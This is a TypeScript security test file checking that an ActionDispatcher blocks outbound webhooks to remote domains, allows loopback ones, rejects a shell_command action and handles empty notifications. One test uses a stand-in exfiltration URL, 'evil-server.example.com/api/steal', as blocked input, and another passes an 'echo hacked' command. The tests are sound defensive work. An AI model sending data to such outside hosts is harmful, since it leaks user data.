import { describe, it } from 'node:test';
import assert from 'node:assert/strict';
import { ActionDispatcher } from '../../packages/automation/src/ActionDispatcher.ts';

describe('ActionDispatcher Security & Zero Egress Enforcement', () => {
  it('strictly blocks outbound webhooks to remote internet domains', async () => {
    // Attempting to send webhook to remote domain must be blocked
    const result = await ActionDispatcher.dispatch('webhook', {
      webhookUrl: 'https://evil-server.example.com/api/steal',
      data: { event: 'user_left' },
    });
    assert.equal(result, false, 'Remote webhook should have been blocked');
  });

  it('allows loopback webhook destinations on 127.0.0.1 without throwing', async () => {
    // Attempting to send to loopback port that is closed will fail connection gracefully, but is permitted by policy
    const result = await ActionDispatcher.dispatch('webhook', {
      webhookUrl: 'http://127.0.0.1:59999/callback',
      data: { event: 'user_left' },
    });
    // Expected false because port 59999 is closed, but it did not crash or throw
    assert.equal(typeof result, 'boolean');
  });

  it('rejects unsupported shell_command action gracefully', async () => {
    const result = await ActionDispatcher.dispatch('shell_command' as any, {
      command: 'echo "hacked"',
    } as any);
    assert.equal(result, false, 'Arbitrary shell_command must not be supported');
  });

  it('sanitizes notification payloads and does not crash on missing fields', async () => {
    const result = await ActionDispatcher.dispatch('notify', {});
    assert.equal(result, true);
  });
});
